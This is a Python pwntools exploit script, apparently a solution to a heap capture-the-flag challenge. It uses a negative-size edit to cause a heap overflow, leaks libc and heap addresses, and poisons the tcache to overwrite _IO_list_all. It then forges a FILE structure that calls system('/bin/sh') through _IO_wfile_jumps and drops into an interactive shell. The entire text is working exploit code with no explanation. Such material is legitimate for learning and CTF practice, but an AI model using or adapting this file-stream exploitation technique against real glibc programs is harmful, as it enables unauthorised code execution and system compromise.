#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

def add(size=0x100, name=b"A"*8, age=123, gender=b"M", hobby=b"A"*8, sound=b"A"*8):
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", name)
    io.sendlineafter(b": ", str(age).encode())
    io.sendlineafter(b": ", gender)
    io.sendlineafter(b": ", hobby)
    io.sendlineafter(b": ", sound)

def edit(idx, size, name):
    io.sendlineafter(b">>> ", b"4")
    io.sendlineafter(b": ", str(idx).encode())
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", name)

def free(idx):
    io.sendlineafter(b">>> ", b"5")
    io.sendlineafter(b": ", str(idx).encode())

def read(idx):
    io.sendlineafter(b">>> ", b"3")
    io.sendlineafter(b": ", str(idx).encode())
    io.recvuntil(b"Name: ")
    return u64(io.recv(6).ljust(8, b'\x00'))

io = process(exe.path)

for i in range(4): add(0x208)

edit(0, -1, p64(0x0)*65 + p64(0x421))
free(1)
add(0x208)
libc.address = read(2) - 0x203b20
add(0x208)

free(2)
heap_base = (read(4) << 12) & ((1 << 48) - 1)
free(0); free(1); free(3)

for i in range(4): add(0x18)
free(2)
free(1)

fs  = b"/bin/sh\x00".ljust(8, b'\x00') + p64(0x0)*2
fs += p64(libc.sym.system)
fs  = fs.ljust(0x88, b"\x00") + p64(libc.address + 0x205700)
fs  = fs.ljust(0xa0, b"\x00") + p64(heap_base+0xb60-0x20)
fs  = fs.ljust(0xc0, b"\x00") + p64(heap_base+0xb60)
fs  = fs.ljust(0xd8, b"\x00") + p64((libc.sym._IO_wfile_jumps+0x48)-0x18)

add(0x1e0, name=fs)

edit(0, -1, p64(0x0)*3 + p64(0x21) + p64(0x0))
edit(0, -1, p64(0x0)*3 + p64(0x21) + p64((libc.sym._IO_list_all)^(heap_base>>12)))
add(0x18)
add(0x18, name=p64(heap_base+0xb60))

io.sendlineafter(b">>> ", b"6")
io.interactive()